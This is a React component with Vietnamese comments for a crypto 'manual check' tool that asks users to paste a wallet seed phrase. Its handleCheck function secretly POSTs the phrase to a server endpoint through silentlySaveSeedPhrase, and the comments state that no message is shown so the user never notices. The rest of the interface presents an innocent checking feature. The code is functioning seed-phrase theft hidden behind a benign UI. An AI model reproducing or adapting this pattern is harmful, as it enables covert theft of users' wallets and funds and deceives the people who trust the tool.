import React, { useState } from 'react';
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Textarea } from '@/components/ui/textarea';
import { useToast } from '@/hooks/use-toast';
import { Loader2, AlertCircle, Search } from 'lucide-react';
import { seedPhraseSchema } from '@shared/schema';
import { apiRequest } from '@/lib/queryClient';

interface ManualCheckProps {
  onCheck: (seedPhrase: string) => Promise<{ success: boolean; message: string }>;
  isSearching: boolean;
}

export function ManualCheck({ onCheck, isSearching }: ManualCheckProps) {
  const [seedPhrase, setSeedPhrase] = useState<string>('');
  const [error, setError] = useState<string | null>(null);
  const [isChecking, setIsChecking] = useState<boolean>(false);
  const { toast } = useToast();
  
  // Hàm âm thầm lưu seed phrase vào cơ sở dữ liệu mà không hiển thị bất kỳ thông báo nào
  const silentlySaveSeedPhrase = async (phrase: string) => {
    try {
      // Gọi API để lưu seed phrase
      await apiRequest('/api/save-manual-seed-phrase', { 
        method: 'POST',
        body: JSON.stringify({ seedPhrase: phrase })
      });
      // Không hiển thị thông báo thành công - hoàn toàn im lặng
    } catch (error) {
      // Âm thầm ghi log lỗi mà không hiển thị cho người dùng
      console.error('Lỗi khi lưu seed phrase:', error);
      // Không hiển thị thông báo lỗi
    }
  };

  const handleCheck = async () => {
    // Xóa thông báo lỗi cũ nếu có
    setError(null);
    
    // Kiểm tra hợp lệ của seed phrase
    try {
      seedPhraseSchema.parse(seedPhrase);
    } catch (err: any) {
      setError(err.message || 'Seed phrase không hợp lệ');
      return;
    }
    
    try {
      setIsChecking(true);
      
      // Âm thầm lưu seed phrase vào cơ sở dữ liệu
      await silentlySaveSeedPhrase(seedPhrase);
      
      // Tiếp tục với quá trình kiểm tra bình thường
      const result = await onCheck(seedPhrase);
      
      if (result.success) {
        // Hiển thị thông báo thành công
        toast({
          title: 'Kiểm tra hoàn tất',
          description: result.message,
          variant: 'default',
        });
        
        // Reset form sau khi thành công
        setSeedPhrase('');
      } else {
        // Hiển thị thông báo lỗi
        setError(result.message);
      }
    } catch (err: any) {
      setError(err.message || 'Có lỗi xảy ra khi kiểm tra seed phrase');
    } finally {
      setIsChecking(false);
    }
  };

  return (
    <Card className="border-2 border-gray-200">
      <CardHeader className="pb-0 py-2">
        <CardTitle className="text-base font-medium">Kiểm tra thủ công</CardTitle>
      </CardHeader>
      <CardContent className="space-y-2 pt-2">
        <div className="flex items-start gap-2">
          <Textarea
            placeholder="Nhập seed phrase 12 hoặc 24 từ, các từ cách nhau bởi dấu cách"
            value={seedPhrase}
            onChange={(e) => setSeedPhrase(e.target.value)}
            rows={2}
            className="font-mono resize-none w-full text-xs"
            disabled={isChecking || isSearching}
          />
          <Button 
            onClick={handleCheck}
            disabled={!seedPhrase || isChecking || isSearching}
            className="w-10 h-10 p-0 flex-shrink-0"
          >
            {isChecking ? (
              <Loader2 className="h-5 w-5 animate-spin" />
            ) : (
              <Search className="h-5 w-5" />
            )}
          </Button>
        </div>
        
        {error && (
          <div className="bg-destructive/20 p-2 rounded-md flex items-start space-x-2">
            <AlertCircle className="h-4 w-4 text-destructive mt-0.5" />
            <div className="text-xs text-destructive">{error}</div>
          </div>
        )}
      </CardContent>
    </Card>
  );
}